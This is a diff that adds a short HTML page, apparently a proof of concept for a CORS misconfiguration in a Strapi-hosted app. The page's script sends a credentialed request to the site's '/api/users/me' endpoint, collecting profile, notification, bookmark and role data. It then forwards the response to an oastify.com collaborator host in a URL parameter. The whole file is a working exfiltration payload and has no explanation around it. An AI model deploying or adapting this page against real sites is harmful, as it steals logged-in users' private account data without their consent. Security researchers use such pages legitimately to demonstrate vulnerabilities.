@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://better-animal-d658c56969.strapiapp.com/api/users/me?populate[profile][populate][images][sort][0]=createdAt%3Adesc&populate[profile][populate][avatar]=true&populate[profile][populate][questionSubscriptions][filters][$or][0][archived][$null]=true&populate[profile][populate][questionSubscriptions][filters][$or][1][archived][$eq]=false&populate[profile][populate][topicSubscriptions][fields][0]=slug&populate[profile][populate][topicSubscriptions][fields][1]=label&populate[profile][populate][postLikes][fields][0]=id&populate[profile][populate][roadmapLikes][fields][0]=id&populate[profile][populate][teams][fields][0]=id&populate[profile][populate][notifications][populate][question][populate][replies]=true&populate[profile][populate][bookmarks]=true&populate[role][fields][0]=type',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/https://4chdi97kupgfgm11fskg20cs6jca00op.oastify.com?key='+encodeURIComponent(this.responseText);
+    };
+</script>
+</head>
+</html>
